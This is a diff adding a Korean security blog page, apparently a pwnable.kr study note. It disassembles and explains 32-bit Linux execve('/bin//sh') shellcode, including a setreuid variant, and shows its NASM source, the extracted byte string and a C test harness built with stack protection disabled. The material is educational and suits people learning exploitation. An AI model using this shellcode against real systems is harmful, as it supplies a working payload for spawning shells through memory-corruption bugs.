@@ -1,0 +1,284 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>[pwnable.kr] Build shellcode in linux | More deeper..</title>
+  <meta name="author" content="Supjerk">
+  
+  <meta name="description" content="오늘은 쉘코드를 한번 만들어 보겠다. https://blog.naver.com/mathboy7/220215329450
+ 이 링크에 나온 쉘코드 하나를 분석해 보면서 말이다.
+https://defuse.ca/online-x86-assembler.htm 에서 첫번째 쉘코드">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="[pwnable.kr] Build shellcode in linux">
+  <meta property="og:site_name" content="More deeper..">
+
+  
+    <meta property="og:image" content="">
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+</html>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">More deeper..</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> [pwnable.kr] Build shellcode in linux</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>오늘은 쉘코드를 한번 만들어 보겠다. <a href="https://blog.naver.com/mathboy7/220215329450" target="_blank" rel="noopener">https://blog.naver.com/mathboy7/220215329450</a></p>
+<p> 이 링크에 나온 쉘코드 하나를 분석해 보면서 말이다.</p>
+<p><a href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener">https://defuse.ca/online-x86-assembler.htm</a> 에서 첫번째 쉘코드(Opcode)를 Disassemble 하면 </p>
+<p>0:  31 c0                   xor    eax,eax<br>2:    50                                       push   eax<br>3:  68 2f 2f 73 68          push   0x68732f2f<br>8:  68 2f 62 69 6e          push   0x6e69622f<br>d:  89 e3                   mov    ebx,esp<br>f:  50                      push   eax<br>10: 53                      push   ebx<br>11: 89 e1                   mov    ecx,esp<br>13: 89 c2                   mov    edx,eax<br>15: b0 0b                   mov    al,0xb<br>17: cd 80                   int    0x80</p>
+<p>0: xor 을 이용해 Null-Byte 입력 문제를 해결했다.</p>
+<p>2: 0을 스택에 넣는다.</p>
+<p>3: “hs//“ 을 스택에 넣는다. 리틀 엔디안이라 “//sh”로 들어간다.</p>
+<p>8: “nib/“ 을 스택에 넣는다. 리틀 엔디안이라 “/bin”로 들어간다.</p>
+<p>d: ebx 에 esp 를 복사한다. (command)</p>
+<p>f: 0을 스택에 넣는다.</p>
+<p>10: ebx(esp) 를 스택에 넣는다. (argv)</p>
+<p>11: ecx 에 esp를 복사한다. (envp)</p>
+<p>13: edx에 0을 넣는다.</p>
+<p>15: al에 0xb를 넣는다.(sys_execve)(eax에 넣으면 Null-Byte 입력문제가 난다.)</p>
+<p>17: 시스템 콜 인터럽트를 생성한다.</p>
+<p>다음으로 setreuid(geteuid(), getreuid()), exit(0) 까지 포함시킨 쉘코드를 보면</p>
+<p>0:  31 c0                   xor    eax,eax ; eax=0<br>2:  b0 31                   mov    al,0x31 ; getuid()<br>4:  cd 80                   int    0x80 ; syscall interrupt<br>6:  89 c3                   mov    ebx,eax ; ebx=0<br>8:  89 c1                   mov    ecx,eax ; ecx=0<br>a:  31 c0                   xor    eax,eax ; eax=0<br>c:  b0 46                   mov    al,0x46 ; setreuid()<br>e:  cd 80                   int    0x80 ; syscall interrupt<br>10: 31 c0                   xor    eax,eax ; eax=0<br>12: 50                      push   eax ; push 0<br>13: 68 2f 2f 73 68          push   0x68732f2f ; “//sh”<br>18: 68 2f 62 69 6e          push   0x6e69622f ; “/bin”<br>1d: 89 e3                   mov    ebx,esp ; ebx=esp, “/bin”&amp;”//sh”<br>1f: 50                      push   eax ; push 0<br>20: 53                      push   ebx ; push command<br>21: 89 e1                   mov    ecx,esp ; ecx=&amp;command(argv)<br>23: 89 c2                   mov    edx,eax ; edx=0(envp)<br>25: b0 0b                   mov    al,0xb ; sys_execve<br>27: cd 80                   int    0x80 ; syscall interrupt<br>29: 31 c0                   xor    eax,eax ; eax=0<br>2b: b0 01                   mov    al,0x1 ; sys_exit<br>2d: cd 80                   int    0x80 ; syscall interrupt</p>
+<p>그럼 마지막으로 쉘코드를 직접 만들어 보겠다.</p>
+<p>main.asm 에</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line"> xor eax,eax</span><br><span class="line"></span><br><span class="line">        push eax</span><br><span class="line"></span><br><span class="line">        push 0x68732f2f</span><br><span class="line"></span><br><span class="line">        push 0x6e69622f</span><br><span class="line"></span><br><span class="line">        mov ebx,esp</span><br><span class="line"></span><br><span class="line">        push ebx</span><br><span class="line"></span><br><span class="line">        mov ecx,esp</span><br><span class="line"></span><br><span class="line">        push eax</span><br><span class="line"></span><br><span class="line">        mov edx,esp</span><br><span class="line"></span><br><span class="line">        push edx</span><br><span class="line"></span><br><span class="line">        mov edx,esp</span><br><span class="line"></span><br><span class="line">        mov al,0xb</span><br><span class="line"></span><br><span class="line">        int 0x80</span><br></pre></td></tr></table></figure>
+<p>를 써넣고</p>
+<p>nasm -f elf32 main</p>
+<p>명령어로 빌드,</p>
+<p>objdump -d -M intel main.o</p>
+<p>명령어로 Opcode 를 추출하면 된다.</p>
+<p>물론 위에 있는 링크로 바로 추출해도 된다.</p>
+<p>이렇게 추출한 쉘코드로</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"> *(&amp;ret+<span class="number">2</span>)=(<span class="keyword">void</span> *)<span class="string">"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x89\xC2\xB0\x0B\xCD\x80"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이렇게 main.c 코드를 짜고</p>
+<p>gcc main.c -m32 -fno-stack-protector -z execstack &amp;&amp; ./a.out</p>
+<p>명령을 내리면 제대로 동작한다는 점을 알수 있다.</p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2019/01/22/pwnable-kr-dragon-write-up/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2019/01/22/pwnable-kr-fsb-writeup/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2019-01-22 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/pwnable-shellcode/">pwnable, shellcode<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2019 Supjerk
+  
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.    
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
